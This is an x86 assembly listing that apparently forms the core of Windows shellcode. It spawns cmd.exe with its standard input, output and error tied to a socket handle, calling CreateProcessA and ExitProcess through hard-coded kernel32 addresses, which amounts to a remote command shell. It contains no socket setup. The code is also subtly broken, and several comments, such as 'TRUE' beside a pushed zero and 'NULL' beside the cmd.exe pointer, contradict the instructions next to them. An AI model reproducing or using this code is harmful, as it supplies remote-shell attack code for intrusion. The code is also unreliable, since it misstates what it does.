section .data
    cmd db 'cmd.exe', 0                ; Command to execute
    socket_fd dd 0x00000080            ; Example socket descriptor
    siStartupInfo STARTUPINFO          ; Space for STARTUPINFO structure
    piProcessInfo PROCESS_INFORMATION  ; Space for PROCESS_INFORMATION structure

section .text
    global _start

_start:
    ; Zero out the STARTUPINFO structure
    xor eax, eax                       ; Clear EAX
    mov ecx, 68                        ; Size of STARTUPINFO (68 bytes)
    lea edi, [siStartupInfo]           ; Address of siStartupInfo
    rep stosb                          ; Zero out the structure
    mov byte [siStartupInfo.cb], 68    ; Set cb field of STARTUPINFO

    ; Set standard handles in STARTUPINFO
    mov eax, [socket_fd]
    mov [siStartupInfo.hStdInput], eax ; Set hStdInput to socket_fd
    mov [siStartupInfo.hStdOutput], eax ; Set hStdOutput to socket_fd
    mov [siStartupInfo.hStdError], eax ; Set hStdError to socket_fd

    ; Indicate that standard handles are being used
    mov dword [siStartupInfo.dwFlags], 0x100  ; STARTF_USESTDHANDLES

    ; Push arguments for CreateProcessA
    lea eax, [piProcessInfo]           ; Pointer to PROCESS_INFORMATION
    push eax                           ; lpProcessInformation
    lea eax, [siStartupInfo]           ; Pointer to STARTUPINFO
    push eax                           ; lpStartupInfo
    xor eax, eax
    push eax                           ; lpCurrentDirectory (NULL)
    push eax                           ; lpEnvironment (NULL)
    xor eax, eax
    push eax                           ; dwCreationFlags (0)
    push eax                           ; bInheritHandles (TRUE)
    push eax                           ; lpThreadAttributes (NULL)
    push eax                           ; lpProcessAttributes (NULL)
    lea eax, [cmd]                     ; Address of "cmd.exe"
    push eax                           ; lpCommandLine
    push eax                           ; lpApplicationName (NULL)
    ; Call CreateProcessA
    mov eax, 0x7C80236B                ; Address of CreateProcessA in kernel32.dll
    call eax

    ; Exit the process
    xor ebx, ebx
    mov eax, 0x7C81D20A                  ; Address of ExitProcess in kernel32.dll
    call eax                              ; Call ExitProcess(0)